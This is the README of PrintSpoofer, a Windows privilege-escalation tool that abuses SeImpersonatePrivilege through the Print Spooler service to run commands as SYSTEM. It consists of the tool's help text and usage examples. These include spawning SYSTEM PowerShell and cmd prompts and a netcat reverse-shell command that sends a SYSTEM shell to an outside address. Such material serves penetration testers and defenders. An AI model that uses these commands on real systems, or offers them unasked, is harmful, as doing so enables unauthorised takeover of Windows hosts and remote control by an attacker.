# PrintSpoofer

From LOCAL/NETWORK SERVICE to SYSTEM by abusing `SeImpersonatePrivilege` on Windows 10 and Server 2016/2019.

## Usage

You can check the help message using the `-h` option.

```txt
C:\TOOLS>print.exe -h

PrintSpoofer v0.1 (by @itm4n)

  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print
  Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()

Arguments:
  -c <CMD>    Execute the command *CMD*
  -i          Interact with the new process in the current command prompt (default is non-interactive)
  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)
  -h          That's me :)

Examples:
  - Run PowerShell as SYSTEM in the current console
      print.exe -i -c powershell.exe
  - Spawn a SYSTEM command prompt on the desktop of the session 1
      PrintSpoofer.exe -d 1 -c cmd.exe
  - Get a SYSTEM reverse shell
      print.exe -c "c:\Temp\nc.exe 123.123.123 1337 -e cmd"
```
